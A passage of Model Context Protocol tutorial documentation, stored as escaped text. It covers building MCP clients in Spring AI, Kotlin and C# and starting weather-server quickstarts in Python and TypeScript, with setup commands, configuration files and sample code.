spring-boot:run\n   ```\n\n<Warning>\n\nMake sure you keep your `ANTHROPIC_API_KEY` and `BRAVE_API_KEY` keys secure!\n\n</Warning>\n\n## How it Works\n\nThe application integrates Spring AI with the Brave Search MCP server through several components:\n\n### MCP Client Configuration\n\n1. Required dependencies in pom.xml:\n\n```xml\n<dependency>\n    <groupId>org.springframework.ai</groupId>\n    <artifactId>spring-ai-starter-mcp-client</artifactId>\n</dependency>\n<dependency>\n    <groupId>org.springframework.ai</groupId>\n    <artifactId>spring-ai-starter-model-anthropic</artifactId>\n</dependency>\n```\n\n2. Application properties (application.yml):\n\n```yml\nspring:\n  ai:\n    mcp:\n      client:\n        enabled: true\n        name: brave-search-client\n        version: 1.0.0\n        type: SYNC\n        request-timeout: 20s\n        stdio:\n          root-change-notification: true\n          servers-configuration: classpath:/mcp-servers-config.json\n        toolcallback:\n          enabled: true\n    anthropic:\n      api-key: ${ANTHROPIC_API_KEY}\n```\n\nThis activates the `spring-ai-starter-mcp-client` to create one or more `McpClient`s based on the provided server configuration.\nThe `spring.ai.mcp.client.toolcallback.enabled=true` property enables the tool callback mechanism, that automatically registers all MCP tool as spring ai tools.\nIt is disabled by default.\n\n3. MCP Server Configuration (`mcp-servers-config.json`):\n\n```json\n{\n  \"mcpServers\": {\n    \"brave-search\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-brave-search\"],\n      \"env\": {\n        \"BRAVE_API_KEY\": \"<PUT YOUR BRAVE API KEY>\"\n      }\n    }\n  }\n}\n```\n\n### Chat Implementation\n\nThe chatbot is implemented using Spring AI's ChatClient with MCP tool integration:\n\n```java\nvar chatClient = chatClientBuilder\n    .defaultSystem(\"You are useful assistant, expert in AI and Java.\")\n    .defaultToolCallbacks((Object[]) mcpToolAdapter.toolCallbacks())\n    .defaultAdvisors(new MessageChatMemoryAdvisor(new InMemoryChatMemory()))\n    .build();\n```\n\nKey features:\n\n- Uses Claude AI model for natural language understanding\n- Integrates Brave Search through MCP for real-time web search capabilities\n- Maintains conversation memory using InMemoryChatMemory\n- Runs as an interactive command-line application\n\n### Build and run\n\n```bash\n./mvnw clean install\njava -jar ./target/ai-mcp-brave-chatbot-0.0.1-SNAPSHOT.jar\n```\n\nor\n\n```bash\n./mvnw spring-boot:run\n```\n\nThe application will start an interactive chat session where you can ask questions. The chatbot will use Brave Search when it needs to find information from the internet to answer your queries.\n\nThe chatbot can:\n\n- Answer questions using its built-in knowledge\n- Perform web searches when needed using Brave Search\n- Remember context from previous messages in the conversation\n- Combine information from multiple sources to provide comprehensive answers\n\n### Advanced Configuration\n\nThe MCP client supports additional configuration options:\n\n- Client customization through `McpSyncClientCustomizer` or `McpAsyncClientCustomizer`\n- Multiple clients with multiple transport types: `STDIO` and `SSE` (Server-Sent Events)\n- Integration with Spring AI's tool execution framework\n- Automatic client initialization and lifecycle management\n\nFor WebFlux-based applications, you can use the WebFlux starter instead:\n\n```xml\n<dependency>\n    <groupId>org.springframework.ai</groupId>\n    <artifactId>spring-ai-mcp-client-webflux-spring-boot-starter</artifactId>\n</dependency>\n```\n\nThis provides similar functionality but uses a WebFlux-based SSE transport implementation, recommended for production deployments.\n\n</Tab>\n\n<Tab title=\"Kotlin\">\n\n[You can find the complete code for this tutorial here.](https://github.com/modelcontextprotocol/kotlin-sdk/tree/main/samples/kotlin-mcp-client)\n\n## System Requirements\n\nBefore starting, ensure your system meets these requirements:\n\n- Java 17 or higher\n- Anthropic API key (Claude)\n\n## Setting up your environment\n\nFirst, let's install `java` and `gradle` if you haven't already.\nYou can download `java` from [official Oracle JDK website](https://www.oracle.com/java/technologies/downloads/).\nVerify your `java` installation:\n\n```bash\njava --version\n```\n\nNow, let's create and set up your project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new directory for our project\nmkdir kotlin-mcp-client\ncd kotlin-mcp-client\n\n# Initialize a new kotlin project\ngradle init\n```\n\n```powershell Windows\n# Create a new directory for our project\nmd kotlin-mcp-client\ncd kotlin-mcp-client\n# Initialize a new kotlin project\ngradle init\n```\n\n</CodeGroup>\n\nAfter running `gradle init`, you will be presented with options for creating your project.\nSelect **Application** as the project type, **Kotlin** as the programming language, and **Java 17** as the Java version.\n\nAlternatively, you can create a Kotlin application using the [IntelliJ IDEA project wizard](https://kotlinlang.org/docs/jvm-get-started.html).\n\nAfter creating the project, add the following dependencies:\n\n<CodeGroup>\n\n```kotlin build.gradle.kts\nval mcpVersion = \"0.4.0\"\nval slf4jVersion = \"2.0.9\"\nval anthropicVersion = \"0.8.0\"\n\ndependencies {\n    implementation(\"io.modelcontextprotocol:kotlin-sdk:$mcpVersion\")\n    implementation(\"org.slf4j:slf4j-nop:$slf4jVersion\")\n    implementation(\"com.anthropic:anthropic-java:$anthropicVersion\")\n}\n```\n\n```groovy build.gradle\ndef mcpVersion = '0.3.0'\ndef slf4jVersion = '2.0.9'\ndef anthropicVersion = '0.8.0'\ndependencies {\n    implementation \"io.modelcontextprotocol:kotlin-sdk:$mcpVersion\"\n    implementation \"org.slf4j:slf4j-nop:$slf4jVersion\"\n    implementation \"com.anthropic:anthropic-java:$anthropicVersion\"\n}\n```\n\n</CodeGroup>\n\nAlso, add the following plugins to your build script:\n\n<CodeGroup>\n\n```kotlin build.gradle.kts\nplugins {\n    id(\"com.github.johnrengelman.shadow\") version \"8.1.1\"\n}\n```\n\n```groovy build.gradle\nplugins {\n    id 'com.github.johnrengelman.shadow' version '8.1.1'\n}\n```\n\n</CodeGroup>\n\n## Setting up your API key\n\nYou'll need an Anthropic API key from the [Anthropic Console](https://console.anthropic.com/settings/keys).\n\nSet up your API key:\n\n```bash\nexport ANTHROPIC_API_KEY='your-anthropic-api-key-here'\n```\n\n<Warning>\n\nMake sure your keep your `ANTHROPIC_API_KEY` secure!\n\n</Warning>\n\n## Creating the Client\n\n### Basic Client Structure\n\nFirst, let's create the basic client class:\n\n```kotlin\nclass MCPClient : AutoCloseable {\n    private val anthropic = AnthropicOkHttpClient.fromEnv()\n    private val mcp: Client = Client(clientInfo = Implementation(name = \"mcp-client-cli\", version = \"1.0.0\"))\n    private lateinit var tools: List<ToolUnion>\n\n    // methods will go here\n\n    override fun close() {\n        runBlocking {\n            mcp.close()\n            anthropic.close()\n        }\n    }\n```\n\n### Server connection management\n\nNext, we'll implement the method to connect to an MCP server:\n\n```kotlin\nsuspend fun connectToServer(serverScriptPath: String) {\n    try {\n        val command = buildList {\n            when (serverScriptPath.substringAfterLast(\".\")) {\n                \"js\" -> add(\"node\")\n                \"py\" -> add(if (System.getProperty(\"os.name\").lowercase().contains(\"win\")) \"python\" else \"python3\")\n                \"jar\" -> addAll(listOf(\"java\", \"-jar\"))\n                else -> throw IllegalArgumentException(\"Server script must be a .js, .py or .jar file\")\n            }\n            add(serverScriptPath)\n        }\n\n        val process = ProcessBuilder(command).start()\n        val transport = StdioClientTransport(\n            input = process.inputStream.asSource().buffered(),\n            output = process.outputStream.asSink().buffered()\n        )\n\n        mcp.connect(transport)\n\n        val toolsResult = mcp.listTools()\n        tools = toolsResult?.tools?.map { tool ->\n            ToolUnion.ofTool(\n                Tool.builder()\n                    .name(tool.name)\n                    .description(tool.description ?: \"\")\n                    .inputSchema(\n                        Tool.InputSchema.builder()\n                            .type(JsonValue.from(tool.inputSchema.type))\n                            .properties(tool.inputSchema.properties.toJsonValue())\n                            .putAdditionalProperty(\"required\", JsonValue.from(tool.inputSchema.required))\n                            .build()\n                    )\n                    .build()\n            )\n        } ?: emptyList()\n        println(\"Connected to server with tools: ${tools.joinToString(\", \") { it.tool().get().name() }}\")\n    } catch (e: Exception) {\n        println(\"Failed to connect to MCP server: $e\")\n        throw e\n    }\n}\n```\n\nAlso create a helper function to convert from `JsonObject` to `JsonValue` for Anthropic:\n\n```kotlin\nprivate fun JsonObject.toJsonValue(): JsonValue {\n    val mapper = ObjectMapper()\n    val node = mapper.readTree(this.toString())\n    return JsonValue.fromJsonNode(node)\n}\n```\n\n### Query processing logic\n\nNow let's add the core functionality for processing queries and handling tool calls:\n\n```kotlin\nprivate val messageParamsBuilder: MessageCreateParams.Builder = MessageCreateParams.builder()\n    .model(Model.CLAUDE_SONNET_4_20250514)\n    .maxTokens(1024)\n\nsuspend fun processQuery(query: String): String {\n    val messages = mutableListOf(\n        MessageParam.builder()\n            .role(MessageParam.Role.USER)\n            .content(query)\n            .build()\n    )\n\n    val response = anthropic.messages().create(\n        messageParamsBuilder\n            .messages(messages)\n            .tools(tools)\n            .build()\n    )\n\n    val finalText = mutableListOf<String>()\n    response.content().forEach { content ->\n        when {\n            content.isText() -> finalText.add(content.text().getOrNull()?.text() ?: \"\")\n\n            content.isToolUse() -> {\n                val toolName = content.toolUse().get().name()\n                val toolArgs =\n                    content.toolUse().get()._input().convert(object : TypeReference<Map<String, JsonValue>>() {})\n\n                val result = mcp.callTool(\n                    name = toolName,\n                    arguments = toolArgs ?: emptyMap()\n                )\n                finalText.add(\"[Calling tool $toolName with args $toolArgs]\")\n\n                messages.add(\n                    MessageParam.builder()\n                        .role(MessageParam.Role.USER)\n                        .content(\n                            \"\"\"\n                                \"type\": \"tool_result\",\n                                \"tool_name\": $toolName,\n                                \"result\": ${result?.content?.joinToString(\"\\n\") { (it as TextContent).text ?: \"\" }}\n                            \"\"\".trimIndent()\n                        )\n                        .build()\n                )\n\n                val aiResponse = anthropic.messages().create(\n                    messageParamsBuilder\n                        .messages(messages)\n                        .build()\n                )\n\n                finalText.add(aiResponse.content().first().text().getOrNull()?.text() ?: \"\")\n            }\n        }\n    }\n\n    return finalText.joinToString(\"\\n\", prefix = \"\", postfix = \"\")\n}\n```\n\n### Interactive chat\n\nWe'll add the chat loop:\n\n```kotlin\nsuspend fun chatLoop() {\n    println(\"\\nMCP Client Started!\")\n    println(\"Type your queries or 'quit' to exit.\")\n\n    while (true) {\n        print(\"\\nQuery: \")\n        val message = readLine() ?: break\n        if (message.lowercase() == \"quit\") break\n        val response = processQuery(message)\n        println(\"\\n$response\")\n    }\n}\n```\n\n### Main entry point\n\nFinally, we'll add the main execution function:\n\n```kotlin\nfun main(args: Array<String>) = runBlocking {\n    if (args.isEmpty()) throw IllegalArgumentException(\"Usage: java -jar <your_path>/build/libs/kotlin-mcp-client-0.1.0-all.jar <path_to_server_script>\")\n    val serverPath = args.first()\n    val client = MCPClient()\n    client.use {\n        client.connectToServer(serverPath)\n        client.chatLoop()\n    }\n}\n```\n\n## Running the client\n\nTo run your client with any MCP server:\n\n```bash\n./gradlew build\n\n# Run the client\njava -jar build/libs/<your-jar-name>.jar path/to/server.jar # jvm server\njava -jar build/libs/<your-jar-name>.jar path/to/server.py # python server\njava -jar build/libs/<your-jar-name>.jar path/to/build/index.js # node server\n```\n\n<Note>\n\nIf you're continuing the weather tutorial from the server quickstart, your command might look something like this: `java -jar build/libs/kotlin-mcp-client-0.1.0-all.jar .../samples/weather-stdio-server/build/libs/weather-stdio-server-0.1.0-all.jar`\n\n</Note>\n\n**The client will:**\n\n1. Connect to the specified server\n2. List available tools\n3. Start an interactive chat session where you can:\n   - Enter queries\n   - See tool executions\n   - Get responses from Claude\n\n## How it works\n\nHere's a high-level workflow schema:\n\n```mermaid\n---\nconfig:\n    theme: neutral\n---\nsequenceDiagram\n    actor User\n    participant Client\n    participant Claude\n    participant MCP_Server as MCP Server\n    participant Tools\n\n    User->>Client: Send query\n    Client<<->>MCP_Server: Get available tools\n    Client->>Claude: Send query with tool descriptions\n    Claude-->>Client: Decide tool execution\n    Client->>MCP_Server: Request tool execution\n    MCP_Server->>Tools: Execute chosen tools\n    Tools-->>MCP_Server: Return results\n    MCP_Server-->>Client: Send results\n    Client->>Claude: Send tool results\n    Claude-->>Client: Provide final response\n    Client-->>User: Display response\n```\n\nWhen you submit a query:\n\n1. The client gets the list of available tools from the server\n2. Your query is sent to Claude along with tool descriptions\n3. Claude decides which tools (if any) to use\n4. The client executes any requested tool calls through the server\n5. Results are sent back to Claude\n6. Claude provides a natural language response\n7. The response is displayed to you\n\n## Best practices\n\n1. **Error Handling**\n   - Leverage Kotlin's type system to model errors explicitly\n   - Wrap external tool and API calls in `try-catch` blocks when exceptions are possible\n   - Provide clear and meaningful error messages\n   - Handle network timeouts and connection issues gracefully\n\n2. **Security**\n   - Store API keys and secrets securely in `local.properties`, environment variables, or secret managers\n   - Validate all external responses to avoid unexpected or unsafe data usage\n   - Be cautious with permissions and trust boundaries when using tools\n\n## Troubleshooting\n\n### Server Path Issues\n\n- Double-check the path to your server script is correct\n- Use the absolute path if the relative path isn't working\n- For Windows users, make sure to use forward slashes (/) or escaped backslashes (\\\\) in the path\n- Make sure that the required runtime is installed (java for Java, npm for Node.js, or uv for Python)\n- Verify the server file has the correct extension (.jar for Java, .js for Node.js or .py for Python)\n\nExample of correct path usage:\n\n```bash\n# Relative path\njava -jar build/libs/client.jar ./server/build/libs/server.jar\n\n# Absolute path\njava -jar build/libs/client.jar /Users/username/projects/mcp-server/build/libs/server.jar\n\n# Windows path (either format works)\njava -jar build/libs/client.jar C:/projects/mcp-server/build/libs/server.jar\njava -jar build/libs/client.jar C:\\\\projects\\\\mcp-server\\\\build\\\\libs\\\\server.jar\n```\n\n### Response Timing\n\n- The first response might take up to 30 seconds to return\n- This is normal and happens while:\n  - The server initializes\n  - Claude processes the query\n  - Tools are being executed\n- Subsequent responses are typically faster\n- Don't interrupt the process during this initial waiting period\n\n### Common Error Messages\n\nIf you see:\n\n- `Connection refused`: Ensure the server is running and the path is correct\n- `Tool execution failed`: Verify the tool's required environment variables are set\n- `ANTHROPIC_API_KEY is not set`: Check your environment variables\n\n</Tab>\n\n<Tab title=\"C#\">\n\n[You can find the complete code for this tutorial here.](https://github.com/modelcontextprotocol/csharp-sdk/tree/main/samples/QuickstartClient)\n\n## System Requirements\n\nBefore starting, ensure your system meets these requirements:\n\n- .NET 8.0 or higher\n- Anthropic API key (Claude)\n- Windows, Linux, or macOS\n\n## Setting up your environment\n\nFirst, create a new .NET project:\n\n```bash\ndotnet new console -n QuickstartClient\ncd QuickstartClient\n```\n\nThen, add the required dependencies to your project:\n\n```bash\ndotnet add package ModelContextProtocol --prerelease\ndotnet add package Anthropic.SDK\ndotnet add package Microsoft.Extensions.Hosting\ndotnet add package Microsoft.Extensions.AI\n```\n\n## Setting up your API key\n\nYou'll need an Anthropic API key from the [Anthropic Console](https://console.anthropic.com/settings/keys).\n\n```bash\ndotnet user-secrets init\ndotnet user-secrets set \"ANTHROPIC_API_KEY\" \"<your key here>\"\n```\n\n## Creating the Client\n\n### Basic Client Structure\n\nFirst, let's setup the basic client class in the file `Program.cs`:\n\n```csharp\nusing Anthropic.SDK;\nusing Microsoft.Extensions.AI;\nusing Microsoft.Extensions.Configuration;\nusing Microsoft.Extensions.Hosting;\nusing ModelContextProtocol.Client;\nusing ModelContextProtocol.Protocol.Transport;\n\nvar builder = Host.CreateApplicationBuilder(args);\n\nbuilder.Configuration\n    .AddEnvironmentVariables()\n    .AddUserSecrets<Program>();\n```\n\nThis creates the beginnings of a .NET console application that can read the API key from user secrets.\n\nNext, we'll setup the MCP Client:\n\n```csharp\nvar (command, arguments) = GetCommandAndArguments(args);\n\nvar clientTransport = new StdioClientTransport(new()\n{\n    Name = \"Demo Server\",\n    Command = command,\n    Arguments = arguments,\n});\n\nawait using var mcpClient = await McpClientFactory.CreateAsync(clientTransport);\n\nvar tools = await mcpClient.ListToolsAsync();\nforeach (var tool in tools)\n{\n    Console.WriteLine($\"Connected to server with tools: {tool.Name}\");\n}\n```\n\nAdd this function at the end of the `Program.cs` file:\n\n```csharp\nstatic (string command, string[] arguments) GetCommandAndArguments(string[] args)\n{\n    return args switch\n    {\n        [var script] when script.EndsWith(\".py\") => (\"python\", args),\n        [var script] when script.EndsWith(\".js\") => (\"node\", args),\n        [var script] when Directory.Exists(script) || (File.Exists(script) && script.EndsWith(\".csproj\")) => (\"dotnet\", [\"run\", \"--project\", script, \"--no-build\"]),\n        _ => throw new NotSupportedException(\"An unsupported server script was provided. Supported scripts are .py, .js, or .csproj\")\n    };\n}\n```\n\nThis creates an MCP client that will connect to a server that is provided as a command line argument. It then lists the available tools from the connected server.\n\n### Query processing logic\n\nNow let's add the core functionality for processing queries and handling tool calls:\n\n```csharp\nusing var anthropicClient = new AnthropicClient(new APIAuthentication(builder.Configuration[\"ANTHROPIC_API_KEY\"]))\n    .Messages\n    .AsBuilder()\n    .UseFunctionInvocation()\n    .Build();\n\nvar options = new ChatOptions\n{\n    MaxOutputTokens = 1000,\n    ModelId = \"claude-sonnet-4-20250514\",\n    Tools = [.. tools]\n};\n\nConsole.ForegroundColor = ConsoleColor.Green;\nConsole.WriteLine(\"MCP Client Started!\");\nConsole.ResetColor();\n\nPromptForInput();\nwhile(Console.ReadLine() is string query && !\"exit\".Equals(query, StringComparison.OrdinalIgnoreCase))\n{\n    if (string.IsNullOrWhiteSpace(query))\n    {\n        PromptForInput();\n        continue;\n    }\n\n    await foreach (var message in anthropicClient.GetStreamingResponseAsync(query, options))\n    {\n        Console.Write(message);\n    }\n    Console.WriteLine();\n\n    PromptForInput();\n}\n\nstatic void PromptForInput()\n{\n    Console.WriteLine(\"Enter a command (or 'exit' to quit):\");\n    Console.ForegroundColor = ConsoleColor.Cyan;\n    Console.Write(\"> \");\n    Console.ResetColor();\n}\n```\n\n## Key Components Explained\n\n### 1. Client Initialization\n\n- The client is initialized using `McpClientFactory.CreateAsync()`, which sets up the transport type and command to run the server.\n\n### 2. Server Connection\n\n- Supports Python, Node.js, and .NET servers.\n- The server is started using the command specified in the arguments.\n- Configures to use stdio for communication with the server.\n- Initializes the session and available tools.\n\n### 3. Query Processing\n\n- Leverages [Microsoft.Extensions.AI](https://learn.microsoft.com/dotnet/ai/ai-extensions) for the chat client.\n- Configures the `IChatClient` to use automatic tool (function) invocation.\n- The client reads user input and sends it to the server.\n- The server processes the query and returns a response.\n- The response is displayed to the user.\n\n## Running the Client\n\nTo run your client with any MCP server:\n\n```bash\ndotnet run -- path/to/server.csproj # dotnet server\ndotnet run -- path/to/server.py # python server\ndotnet run -- path/to/server.js # node server\n```\n\n<Note>\n\nIf you're continuing the weather tutorial from the server quickstart, your command might look something like this: `dotnet run -- path/to/QuickstartWeatherServer`.\n\n</Note>\n\nThe client will:\n\n1. Connect to the specified server\n2. List available tools\n3. Start an interactive chat session where you can:\n   - Enter queries\n   - See tool executions\n   - Get responses from Claude\n4. Exit the session when done\n\nHere's an example of what it should look like it connected to a weather server quickstart:\n\n<Frame>\n  <img src=\"/images/quickstart-dotnet-client.png\" />\n</Frame>\n\n</Tab>\n\n</Tabs>\n\n## Next steps\n\n<CardGroup cols={2}>\n  <Card title=\"Example servers\" icon=\"grid\" href=\"/examples\">\n    Check out our gallery of official MCP servers and implementations\n  </Card>\n  <Card title=\"Example clients\" icon=\"cubes\" href=\"/clients\">\n    View the list of clients that support MCP integrations\n  </Card>\n</CardGroup>\n"}

Then we'll connect the server to an MCP host (in this case, Claude for Desktop):\n\n<Frame>\n  <img src=\"/images/current-weather.png\" />\n</Frame>\n\n<Note>\n\nServers can connect to any client. We've chosen Claude for Desktop here for simplicity, but we also have guides on [building your own client](/docs/develop/build-client) as well as a [list of other clients here](/clients).\n\n</Note>\n\n### Core MCP Concepts\n\nMCP servers can provide three main types of capabilities:\n\n1. **[Resources](/docs/learn/server-concepts#resources)**: File-like data that can be read by clients (like API responses or file contents)\n2. **[Tools](/docs/learn/server-concepts#tools)**: Functions that can be called by the LLM (with user approval)\n3. **[Prompts](/docs/learn/server-concepts#prompts)**: Pre-written templates that help users accomplish specific tasks\n\nThis tutorial will primarily focus on tools.\n\n<Tabs>\n<Tab title='Python'>\n\nLet's get started with building our weather server! [You can find the complete code for what we'll be building here.](https://github.com/modelcontextprotocol/quickstart-resources/tree/main/weather-server-python)\n\n### Prerequisite knowledge\n\nThis quickstart assumes you have familiarity with:\n\n- Python\n- LLMs like Claude\n\n### Logging in MCP Servers\n\nWhen implementing MCP servers, be careful about how you handle logging:\n\n**For STDIO-based servers:** Never write to standard output (stdout). This includes:\n\n- `print()` statements in Python\n- `console.log()` in JavaScript\n- `fmt.Println()` in Go\n- Similar stdout functions in other languages\n\nWriting to stdout will corrupt the JSON-RPC messages and break your server.\n\n**For HTTP-based servers:** Standard output logging is fine since it doesn't interfere with HTTP responses.\n\n### Best Practices\n\n1. Use a logging library that writes to stderr or files.\n1. For Python, be especially careful - `print()` writes to stdout by default.\n\n### Quick Examples\n\n```python\n# ❌ Bad (STDIO)\nprint(\"Processing request\")\n\n# ✅ Good (STDIO)\nimport logging\nlogging.info(\"Processing request\")\n```\n\n### System requirements\n\n- Python 3.10 or higher installed.\n- You must use the Python MCP SDK 1.2.0 or higher.\n\n### Set up your environment\n\nFirst, let's install `uv` and set up our Python project and environment:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n```\n\n```powershell Windows\npowershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n```\n\n</CodeGroup>\n\nMake sure to restart your terminal afterwards to ensure that the `uv` command gets picked up.\n\nNow, let's create and set up our project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new directory for our project\nuv init weather\ncd weather\n\n# Create virtual environment and activate it\nuv venv\nsource .venv/bin/activate\n\n# Install dependencies\nuv add \"mcp[cli]\" httpx\n\n# Create our server file\ntouch weather.py\n```\n\n```powershell Windows\n# Create a new directory for our project\nuv init weather\ncd weather\n\n# Create virtual environment and activate it\nuv venv\n.venv\\Scripts\\activate\n\n# Install dependencies\nuv add mcp[cli] httpx\n\n# Create our server file\nnew-item weather.py\n```\n\n</CodeGroup>\n\nNow let's dive into building your server.\n\n## Building your server\n\n### Importing packages and setting up the instance\n\nAdd these to the top of your `weather.py`:\n\n```python\nfrom typing import Any\nimport httpx\nfrom mcp.server.fastmcp import FastMCP\n\n# Initialize FastMCP server\nmcp = FastMCP(\"weather\")\n\n# Constants\nNWS_API_BASE = \"https://api.weather.gov\"\nUSER_AGENT = \"weather-app/1.0\"\n```\n\nThe FastMCP class uses Python type hints and docstrings to automatically generate tool definitions, making it easy to create and maintain MCP tools.\n\n### Helper functions\n\nNext, let's add our helper functions for querying and formatting the data from the National Weather Service API:\n\n```python\nasync def make_nws_request(url: str) -> dict[str, Any] | None:\n    \"\"\"Make a request to the NWS API with proper error handling.\"\"\"\n    headers = {\n        \"User-Agent\": USER_AGENT,\n        \"Accept\": \"application/geo+json\"\n    }\n    async with httpx.AsyncClient(follow_redirects=True) as client:\n        try:\n            response = await client.get(url, headers=headers, timeout=30.0)\n            response.raise_for_status()\n            return response.json()\n        except Exception:\n            return None\n\ndef format_alert(feature: dict) -> str:\n    \"\"\"Format an alert feature into a readable string.\"\"\"\n    props = feature[\"properties\"]\n    return f\"\"\"\nEvent: {props.get('event', 'Unknown')}\nArea: {props.get('areaDesc', 'Unknown')}\nSeverity: {props.get('severity', 'Unknown')}\nDescription: {props.get('description', 'No description available')}\nInstructions: {props.get('instruction', 'No specific instructions provided')}\n\"\"\"\n```\n\n### Implementing tool execution\n\nThe tool execution handler is responsible for actually executing the logic of each tool. Let's add it:\n\n```python\n@mcp.tool()\nasync def get_alerts(state: str) -> str:\n    \"\"\"Get weather alerts for a US state.\n\n    Args:\n        state: Two-letter US state code (e.g. CA, NY)\n    \"\"\"\n    url = f\"{NWS_API_BASE}/alerts/active/area/{state}\"\n    data = await make_nws_request(url)\n\n    if not data or \"features\" not in data:\n        return \"Unable to fetch alerts or no alerts found.\"\n\n    if not data[\"features\"]:\n        return \"No active alerts for this state.\"\n\n    alerts = [format_alert(feature) for feature in data[\"features\"]]\n    return \"\\n---\\n\".join(alerts)\n\n@mcp.tool()\nasync def get_forecast(latitude: float, longitude: float) -> str:\n    \"\"\"Get weather forecast for a location.\n\n    Args:\n    \tlatitude: Latitude of the location (recommended: up to 4 decimal places)\n    \tlongitude: Longitude of the location (recommended: up to 4 decimal places)\n    \"\"\"\n    # First get the forecast grid endpoint\n    points_url = f\"{NWS_API_BASE}/points/{latitude},{longitude}\"\n    points_data = await make_nws_request(points_url)\n\n    if not points_data:\n        return \"Unable to fetch forecast data for this location.\"\n\n    # Get the forecast URL from the points response\n    forecast_url = points_data[\"properties\"][\"forecast\"]\n    forecast_data = await make_nws_request(forecast_url)\n\n    if not forecast_data:\n        return \"Unable to fetch detailed forecast.\"\n\n    # Format the periods into a readable forecast\n    periods = forecast_data[\"properties\"][\"periods\"]\n    forecasts = []\n    for period in periods[:5]:  # Only show next 5 periods\n        forecast = f\"\"\"\n{period['name']}:\nTemperature: {period['temperature']}°{period['temperatureUnit']}\nWind: {period['windSpeed']} {period['windDirection']}\nForecast: {period['detailedForecast']}\n\"\"\"\n        forecasts.append(forecast)\n\n    return \"\\n---\\n\".join(forecasts)\n```\n\n### Running the server\n\nFinally, let's initialize and run the server:\n\n```python\ndef main():\n    # Initialize and run the server\n    mcp.run(transport='stdio')\n\nif __name__ == \"__main__\":\n    main()\n```\n\nYour server is complete! Run `uv run weather.py` to start the MCP server, which will listen for messages from MCP hosts.\n\nLet's now test your server from an existing MCP host, Claude for Desktop.\n\n## Testing your server with Claude for Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux. Linux users can proceed to the [Building a client](/docs/develop/build-client) tutorial to build an MCP client that connects to the server we just built.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed. [You can install the latest version\nhere.](https://claude.ai/download) If you already have Claude for Desktop, **make sure it's updated to the latest version.**\n\nWe'll need to configure Claude for Desktop for whichever MCP servers you want to use. To do this, open your Claude for Desktop App configuration at `~/Library/Application Support/Claude/claude_desktop_config.json` in a text editor. Make sure to create the file if it doesn't exist.\n\nFor example, if you have [VS Code](https://code.visualstudio.com/) installed:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncode ~/Library/Application\\ Support/Claude/claude_desktop_config.json\n```\n\n```powershell Windows\ncode $env:AppData\\Claude\\claude_desktop_config.json\n```\n\n</CodeGroup>\n\nYou'll then add your servers in the `mcpServers` key. The MCP UI elements will only show up in Claude for Desktop if at least one server is properly configured.\n\nIn this case, we'll add our single weather server like so:\n\n<CodeGroup>\n\n```json macOS/Linux\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"uv\",\n      \"args\": [\n        \"--directory\",\n        \"/ABSOLUTE/PATH/TO/PARENT/FOLDER/weather\",\n        \"run\",\n        \"weather.py\"\n      ]\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"uv\",\n      \"args\": [\n        \"--directory\",\n        \"C:\\\\ABSOLUTE\\\\PATH\\\\TO\\\\PARENT\\\\FOLDER\\\\weather\",\n        \"run\",\n        \"weather.py\"\n      ]\n    }\n  }\n}\n```\n\n</CodeGroup>\n\n<Warning>\n\nYou may need to put the full path to the `uv` executable in the `command` field. You can get this by running `which uv` on macOS/Linux or `where uv` on Windows.\n\n</Warning>\n\n<Note>\n\nMake sure you pass in the absolute path to your server. You can get this by running `pwd` on macOS/Linux or `cd` on Windows Command Prompt. On Windows, remember to use double backslashes (`\\\\`) or forward slashes (`/`) in the JSON path.\n\n</Note>\n\nThis tells Claude for Desktop:\n\n1. There's an MCP server named \"weather\"\n2. To launch it by running `uv --directory /ABSOLUTE/PATH/TO/PARENT/FOLDER/weather run weather.py`\n\nSave the file, and restart **Claude for Desktop**.\n\n</Tab>\n\n<Tab title='TypeScript'>\n\nLet's get started with building our weather server! [You can find the complete code for what we'll be building here.](https://github.com/modelcontextprotocol/quickstart-resources/tree/main/weather-server-typescript)\n\n### Prerequisite knowledge\n\nThis quickstart assumes you have familiarity with:\n\n- TypeScript\n- LLMs like Claude\n\n### Logging in MCP Servers\n\nWhen implementing MCP servers, be careful about how you handle logging:\n\n**For STDIO-based servers:** Never write to standard output (stdout).

For JavaScript, be especially careful - `console.log()` writes to stdout by default\n\n### Quick Examples\n\n```javascript\n// ❌ Bad (STDIO)\nconsole.log(\"Server started\");\n\n// ✅ Good (STDIO)\nconsole.error(\"Server started\"); // stderr is safe\n```\n\n### System requirements\n\nFor TypeScript, make sure you have the latest version of Node installed.\n\n### Set up your environment\n\nFirst, let's install Node.js and npm if you haven't already. You can download them from [nodejs.org](https://nodejs.org/).\nVerify your Node.js installation:\n\n```bash\nnode --version\nnpm --version\n```\n\nFor this tutorial, you'll need Node.js version 16 or higher.\n\nNow, let's create and set up our project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new directory for our project\nmkdir weather\ncd weather\n\n# Initialize a new npm project\nnpm init -y\n\n# Install dependencies\nnpm install @modelcontextprotocol/sdk zod@3\nnpm install -D @types/node typescript\n\n# Create our files\nmkdir src\ntouch src/index.ts\n```\n\n```powershell Windows\n# Create a new directory for our project\nmd weather\ncd weather\n\n# Initialize a new npm project\nnpm init -y\n\n# Install dependencies\nnpm install @modelcontextprotocol/sdk zod@3\nnpm install -D @types/node typescript\n\n# Create our files\nmd src\nnew-item src\\index.ts\n```\n\n</CodeGroup>\n\nUpdate your package.json to add type: \"module\" and a build script:\n\n```json package.json\n{\n  \"type\": \"module\",\n  \"bin\": {\n    \"weather\": \"./build/index.js\"\n  },\n  \"scripts\": {\n    \"build\": \"tsc && chmod 755 build/index.js\"\n  },\n  \"files\": [\"build\"]\n}\n```\n\nCreate a `tsconfig.json` in the root of your project:\n\n```json tsconfig.json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"Node16\",\n    \"moduleResolution\": \"Node16\",\n    \"outDir\": \"./build\",\n    \"rootDir\": \"./src\",\n    \"strict\": true,\n    \"esModuleInterop\": 